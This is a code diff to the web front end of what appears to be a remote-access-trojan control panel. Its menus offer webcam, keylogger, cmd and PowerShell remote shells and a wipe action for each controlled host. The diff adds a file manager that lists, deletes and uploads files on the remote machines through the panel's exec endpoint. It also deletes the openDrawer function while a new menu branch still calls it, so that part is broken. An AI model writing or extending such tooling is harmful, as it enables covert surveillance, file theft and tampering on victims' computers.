@@ -11,6 +11,8 @@ const state = {
 let pollTimer = null;
 let pollIntervalMs = 3000;
 
+let filePath = "C:\\";
+
 async function loadMe() {
   const r = await fetch('/api/me');
   if (r.status === 401) { location.href = '/signin.html'; return; }
@@ -164,20 +166,6 @@ function buildRow(c, onOpen) {
   return el;
 }
 
-// ---------- DRAWER SYSTEM ----------
-function openDrawer() {
-  $('drawer').classList.add('open');
-  $('drawer-backdrop').classList.add('open');
-}
-function closeDrawer() {
-  $('drawer').classList.remove('open');
-  $('drawer-backdrop').classList.remove('open');
-}
-
-$('drawer-close').addEventListener('click', closeDrawer);
-$('drawer-backdrop').addEventListener('click', closeDrawer);
-document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeDrawer(); });
-
 async function openHostDetail(c) {
   $('drawer-title').textContent = c.hostname;
   const box = $('drawer-content');
@@ -195,6 +183,7 @@ async function openHostDetail(c) {
       </div>
 
       <div style="display:flex;gap:8px;margin-top:24px;flex-wrap:wrap">
+        <button class="ghost mini" data-files>open files</button>
         <button class="ghost mini" data-remote>go to remote</button>
         <button class="ghost mini" data-del style="border-color:rgba(248,113,113,.35);color:var(--red)">delete</button>
       </div>
@@ -203,7 +192,8 @@ async function openHostDetail(c) {
       <div id="u-list" style="margin-top:12px;"><div class="note">loading…</div></div>
     </div>`;
 
-  openDrawer();
+  $('drawer').classList.add('open');
+  $('drawer-backdrop').classList.add('open');
 
   box.querySelector('[data-remote]').addEventListener('click', () => {
     closeDrawer();
@@ -211,6 +201,9 @@ async function openHostDetail(c) {
     state.remote.q = c.hostname;
     $('r-search').value = c.hostname;
     loadRemote();
+  });
+  box.querySelector('[data-files]').addEventListener('click', () => {
+    openFileManager(c);
   });
   box.querySelector('[data-del]').addEventListener('click', async () => {
     if (!confirm(`delete ${c.hostname}?`)) return;
@@ -245,6 +238,179 @@ async function loadUploads(clientId, container) {
     container.appendChild(el);
   });
 }
+
+// ---------- FILE MANAGER ----------
+async function runFileOp(clientId, action, path, extra = {}) {
+  return new Promise((resolve) => {
+    // create a unique id for this specific file request so we can poll for it
+    const cmdId = "file_" + Math.random().toString(36).substring(2);
+    const payload = JSON.stringify({ action, path, ...extra });
+    
+    // we send it as a command with shell="file", line=payload
+    fetch(`/api/clients/${clientId}/exec`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ shell: 'file', line: payload }),
+    }).then(r => r.json()).then(d => {
+       // the client will send back a result. we need to poll the commands table
+       // until it's done.
+       const interval = setInterval(async () => {
+         try {
+            const cmdRows = await (await fetch(`/api/clients/${clientId}/commands`)).json();
+            const thisCmd = cmdRows.find(x => x.id === d.commandId);
+            if (thisCmd && thisCmd.status === 'done') {
+              clearInterval(interval);
+              resolve(thisCmd.output);
+            }
+         } catch {}
+       }, 500);
+    });
+  });
+}
+
+let fileClient = null;
+
+async function openFileManager(c) {
+  fileClient = c;
+  filePath = "C:\\";
+  $('drawer-title').textContent = `Files: ${c.hostname}`;
+  await renderFileList();
+}
+
+async function renderFileList() {
+  const box = $('drawer-content');
+  box.innerHTML = `
+    <div style="display:flex;gap:8px;margin-bottom:16px;">
+      <button class="ghost mini" id="file-up">up</button>
+      <input id="file-path" value="${esc(filePath)}" style="flex:1;padding:6px 12px;font-size:13px;">
+      <button class="ghost mini" id="file-go">go</button>
+      <button class="ghost mini" id="file-upload-btn" style="border-color:var(--green);color:var(--green)">upload</button>
+      <input type="file" id="file-upload-input" style="display:none">
+    </div>
+    <div id="file-list" style="display:flex;flex-direction:column;gap:6px;">
+      <div class="note">loading…</div>
+    </div>
+  `;
+
+  const updateList = async () => {
+    $('file-path').value = filePath;
+    $('file-list').innerHTML = '<div class="note">loading…</div>';
+    
+    const res = await runFileOp(fileClient.id, 'list', filePath);
+    if (!res || !res.startsWith('b64:')) {
+      $('file-list').innerHTML = `<div class="err">failed: ${esc(res || 'no response')}</div>`;
+      return;
+    }
+
+    const data = JSON.parse(atob(res.slice(4)));
+    if (!data.ok) {
+      $('file-list').innerHTML = `<div class="err">failed to list dir</div>`;
+      return;
+    }
+
+    const list = $('file-list');
+    list.innerHTML = '';
+
+    if (data.items.length === 0) {
+      list.innerHTML = '<div class="note">folder is empty</div>';
+      return;
+    }
+
+    // sort directories first, then alphabetically
+    data.items.sort((a, b) => {
+      if (a.dir && !b.dir) return -1;
+      if (!a.dir && b.dir) return 1;
+      return a.name.localeCompare(b.name);
+    });
+
+    data.items.forEach(item => {
+      const row = document.createElement('div');
+      row.style.cssText = "display:flex; justify-content:space-between; align-items:center; padding:8px 12px; background:var(--bg); border:1px solid var(--line); border-radius:var(--r-sm); font-size:13px; cursor:pointer;";
+      row.innerHTML = `
+        <div style="display:flex; align-items:center; gap:10px; overflow:hidden;">
+          <svg class="icon" viewBox="0 0 24 24" style="width:14px;height:14px; stroke: ${item.dir ? 'var(--accent)' : 'var(--muted)'};">
+            ${item.dir 
+              ? '<path d="M4 20h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.93a2 2 0 0 1-1.66-.9l-.82-1.2A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13c0 1.1.9 2 2 2Z"/>' 
+              : '<path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/>'}
+          </svg>
+          <span style="white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${esc(item.name)}</span>
+        </div>
+        <div style="display:flex; gap:12px; align-items:center;">
+          <span style="color:var(--muted); font-size:11px; font-family:var(--mono);">${item.dir ? '' : humanSize(item.size)}</span>
+          <button class="ghost mini" data-del style="padding:2px 8px; border-color:var(--red); color:var(--red); display:${item.dir ? 'none' : 'block'};">del</button>
+        </div>
+      `;
+
+      row.addEventListener('click', (e) => {
+        if (e.target.closest('[data-del]')) return;
+        if (item.dir) {
+          filePath = filePath.endsWith('\\') ? filePath + item.name : filePath + '\\' + item.name;
+          updateList();
+        }
+      });
+
+      row.querySelector('[data-del]').addEventListener('click', async () => {
+        if (!confirm(`delete ${item.name}?`)) return;
+        const fullPath = filePath.endsWith('\\') ? filePath + item.name : filePath + '\\' + item.name;
+        const res = await runFileOp(fileClient.id, 'delete', fullPath);
+        if (res === 'ok') updateList();
+        else alert(`delete failed: ${res}`);
+      });
+
+      list.appendChild(row);
+    });
+  };
+
+  $('file-up').addEventListener('click', () => {
+    if (filePath.length <= 3) return;
+    const parts = filePath.replace(/\\$/, '').split('\\');
+    parts.pop();
+    filePath = parts.join('\\') + '\\';
+    if (filePath === '') filePath = 'C:\\';
+    updateList();
+  });
+
+  $('file-go').addEventListener('click', () => {
+    filePath = $('file-path').value;
+    updateList();
+  });
+
+  $('file-upload-btn').addEventListener('click', () => $('file-upload-input').click());
+
+  $('file-upload-input').addEventListener('change', async (e) => {
+    const file = e.target.files[0];
+    if (!file) return;
+
+    $('file-upload-btn').textContent = '...';
+    $('file-upload-btn').disabled = true;
+
+    const reader = new FileReader();
+    reader.onload = async () => {
+      const b64 = reader.result.split(',')[1];
+      const res = await runFileOp(fileClient.id, 'upload', filePath, { name: file.name, data: b64 });
+      if (res === 'ok') {
+        updateList();
+      } else {
+        alert(`upload failed: ${res}`);
+      }
+      $('file-upload-btn').textContent = 'upload';
+      $('file-upload-btn').disabled = false;
+      $('file-upload-input').value = '';
+    };
+    reader.readAsDataURL(file);
+  });
+
+  updateList();
+}
+
+function closeDrawer() {
+  $('drawer').classList.remove('open');
+  $('drawer-backdrop').classList.remove('open');
+}
+
+$('drawer-close').addEventListener('click', closeDrawer);
+$('drawer-backdrop').addEventListener('click', closeDrawer);
+document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeDrawer(); });
 
 // ---------- REMOTE ----------
 async function loadRemote() {
@@ -311,6 +477,7 @@ function openGearMenu(anchor, c) {
     <div class="item" data-item="rdp">screen (rdp)</div>
     <div class="item" data-item="webcam">webcam</div>
     <div class="item" data-item="keylog">keylogger</div>
+    <div class="item" data-item="files">file manager</div>
     <div class="sep"></div>
     <div class="item" data-item="cmd">remote shell — cmd</div>
     <div class="item" data-item="ps">remote shell — powershell</div>
@@ -328,6 +495,7 @@ function openGearMenu(anchor, c) {
       else if (it === 'cmd') openConsole(c, 'cmd');
       else if (it === 'ps') openConsole(c, 'powershell');
       else if (it === 'wipe') wipeClient(c);
+      else if (it === 'files') { openDrawer(); openFileManager(c); }
     });
   });
   document.body.appendChild(menu);
